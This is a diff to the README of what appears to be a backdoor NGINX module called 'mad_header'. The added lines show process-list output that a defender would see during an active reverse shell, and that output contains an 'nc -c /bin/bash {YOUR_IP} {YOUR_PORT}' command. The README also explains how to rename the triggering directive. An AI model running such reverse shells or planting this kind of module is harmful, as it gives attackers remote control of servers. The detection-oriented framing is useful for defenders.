@@ -72,6 +72,16 @@ Commercial support is available at
 </html>
 ```
 
+For those curious, if one were to setup a reverse shell from this exploit and a blue team member ran `ps -fax` then they would see something like the following output while the shell was active.
+
+```
+ 17622 ?        Ss     0:00  \_ nginx: master process /usr/local/nginx/sbin/nginx
+ 17623 ?        S      0:00      \_ nginx: worker process
+ 17719 ?        S      0:00          \_ sh -c nc -c /bin/bash {YOUR_IP} {YOUR_PORT} 2>&1
+ 17720 ?        S      0:00              \_ sh -c /bin/bash
+ 17721 ?        S      0:00                  \_ /bin/bash
+```
+
 ## Customization
 For customization the NGINX directive can be changed by altering the directive string in the `ngx_http_mad_header_commands` struct in `ngx_http_mad_header_module.c` (it is currently set to `mad_header`).
 
